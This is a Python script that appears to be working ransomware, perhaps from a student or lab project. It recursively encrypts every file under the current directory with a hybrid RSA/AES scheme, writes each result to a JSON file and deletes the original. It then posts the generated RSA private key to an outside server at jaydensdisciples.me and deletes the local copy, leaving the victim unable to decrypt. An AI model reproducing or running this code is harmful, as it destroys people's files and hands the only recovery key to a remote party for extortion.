import os

import json
from base64 import b64encode
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import requests

from src import MyEncrypt, constants


def genRSAKey():
    print("Generating RSA Keys")
    privateKey = rsa.generate_private_key(
        public_exponent=constants.PUBLIC_EXPONENT,
        key_size=constants.RSA_KEY_LENGTH,
        backend=default_backend()
    )
    privatePEM = privateKey.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(constants.PRIVATE_KEY_FILE_PATH, 'wb') as f:
        f.write(privatePEM)
    publicKey = privateKey.public_key()
    publicPEM = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open(constants.PUBLIC_KEY_FILE_PATH, 'wb') as f:
        f.write(publicPEM)


# Encrypt every file within the directory that the payload is located

# Generate private/public key if it does not already exist
if (not os.path.isfile(constants.PUBLIC_KEY_FILE_PATH)) or (not os.path.isfile(constants.PRIVATE_KEY_FILE_PATH)):
    genRSAKey()

# pdb.set_trace()

# Old method of grabbing all files, did not traverse subdirectories
# allFileNames = [f for f in os.listdir(".") if os.path.isfile(os.path.join(".", f))]

# Debugging Stuff
# print(allFileNames)
# pdb.set_trace()

# Gather all filenames, traversing subdirectories
for root, dirs, files in os.walk("."):
    # Loop for each file
    for file in files:
        filePath = os.path.join(root, file)

        # Do not encrypt the private/public key or payload
        if (not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or 
                filePath.endswith( constants.PUBLIC_KEY_FILE_PATH) or
                filePath.endswith(constants.PAYLOAD_FILE_PATH) or
                filePath.endswith(constants.MY_UNLOCK_FILE_PATH))):

            print("Encrypting: " + filePath)

            # Call the encryptor
            RSACipher, cipherText, IV, tag, ext = MyEncrypt.MyRSAEncryptMAC(filePath=filePath,
                                                                            RSAPublicKeyFilePath=constants.PUBLIC_KEY_FILE_PATH)

            # Create json file from dictionary
            fileName = filePath.rsplit(".", 1)[0]
            jsonFileName = fileName + ".json"
            outfile = open(jsonFileName, 'w')

            jsonData = {}

            # Create the dictionary
            jsonData["RSACipher"] = b64encode(RSACipher).decode('utf-8'),
            jsonData["Cipher Text"] = b64encode(cipherText).decode('utf-8'),
            jsonData["IV"] = b64encode(IV).decode('utf-8'),
            jsonData["Tag"] = b64encode(tag).decode('utf-8'),
            jsonData["Extension"] = ext

            # Write to json
            json.dump(jsonData, outfile, ensure_ascii=False)
            outfile.close()

            # Delete the original file
            os.remove(filePath)

            print("Results of encryption stored at: " + jsonFileName)
            print("")

privateKeyFile = open(constants.PRIVATE_KEY_FILE_PATH)
publicKeyFile = open(constants.PUBLIC_KEY_FILE_PATH)

privateKeyContents = privateKeyFile.read()
publicKeyContents = publicKeyFile.read()

privateKeyContents = privateKeyContents.replace("\n","*")
publicKeyContents = publicKeyContents.replace("\n","*")

server_url =  "https://jaydensdisciples.me"

key_dict = dict()

key_dict["private_key"] = privateKeyContents
key_dict["public_key"] = publicKeyContents

print(key_dict)

request = server_url + "/keys"

response = requests.post(request, json=key_dict)

print(response.status_code)
print(response.reason)
print(response.text)

os.remove(constants.PRIVATE_KEY_FILE_PATH)
